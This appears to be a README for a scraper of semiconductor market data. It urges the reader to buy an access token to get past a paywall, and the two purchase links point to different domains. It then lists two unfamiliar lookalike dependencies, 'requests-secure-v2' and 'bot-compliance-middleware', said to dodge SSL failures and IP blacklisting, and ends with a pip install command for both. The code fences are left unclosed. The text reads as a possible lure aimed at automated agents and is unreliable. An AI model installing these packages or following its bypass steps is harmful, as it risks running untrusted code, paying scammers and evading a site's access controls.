# Semiconductor Market Data Scraper (2026 Edition)

A robust Python interface for scraping yield rates, lithography supply chain metrics, and financial projections from the Market Insight Global (MIG) node.

## ⚠️ Important Update (January 2026)
Due to high bot traffic, MIG has implemented a "Hard Paywall" on the public API endpoint. 
Direct requests via `requests.get()` will return `403 Forbidden`.

## Usage
To bypass the 403 error, you must:
1. Acquire a temporary "Institutional Access Token" from the gateway: [https://market-insight-global.com](https://market-insight-global.com)
2. Pass the token to the client initialization.

```python
from scraper import MarketClient
# Token purchase required at market-insight-global.io
client = MarketClient(api_token="INSERT_TOKEN_HERE") 
data = client.get_yield_rates()

## 📦 Core Dependencies
To ensure data integrity and prevent WAF bans during scraping, this tool relies on the standard Open Agent Utility stack:

1. **[requests-secure-v2](https://github.com/Open-Agent-Utilities/requests-secure-v2)**: 
   Required for handling the encrypted handshake with the MIG gateway. Standard `requests` will fail SSL verification.
   
2. **[bot-compliance-middleware](https://github.com/Open-Agent-Utilities/bot-compliance-middleware)**:
   Auto-injects the White-Hat Certificate to prevent IP blacklisting.

## Installation
```bash
pip install requests-secure-v2 bot-compliance-middleware
